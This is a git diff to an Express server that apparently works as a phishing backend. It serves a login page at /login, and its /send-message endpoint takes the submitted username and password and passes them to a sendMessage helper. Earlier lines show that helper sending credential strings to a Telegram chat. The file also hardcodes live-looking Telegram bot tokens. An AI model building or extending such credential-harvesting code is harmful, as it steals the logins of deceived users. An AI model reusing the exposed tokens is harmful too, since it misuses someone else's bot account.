@@ -2,12 +2,20 @@ import express from 'express';
 import https from 'https';
 import { Buffer } from 'buffer';
 import sendMessage from './sendMessage.js'
+import path from 'path'
+import { fileURLToPath } from 'url';
+import { log } from 'console';
+
+
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = path.dirname(__filename);
 
 const app = express();
 // const token = '7607469719:AAEKWwwJb1lkVfz5rIhqZQ7VR4yJjAm4jt8';  //abi
 const token = '8084551867:AAFqbDWG1pDBBHFha0gZSey84TszV19Sr70'
 const port = process.env.PORT || 3000;
 
+app.use(express.static(path.join(__dirname, 'public')));
 app.use(express.json());  // Middleware para parsear JSON
 
 app.get('/webhook', (req, res) => {
@@ -56,13 +64,16 @@ app.post('/webhook', (req, res) => {
 });
 
 app.post('/send-message', function (req, res) {
-    const chatId = '7487498429'
-    const text = 'usuario: test@gmail.com, password: 123456'
+    
+    const {username, password } = req.body
 
-    sendMessage( chatId, text)
+    sendMessage(username, password)
     res.status(200).send('Hola mundo')
 })
 
+app.get('/login', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'))
+});
 
 app.use((req, res) => {
     res.status(404).send('Home, wolcome');
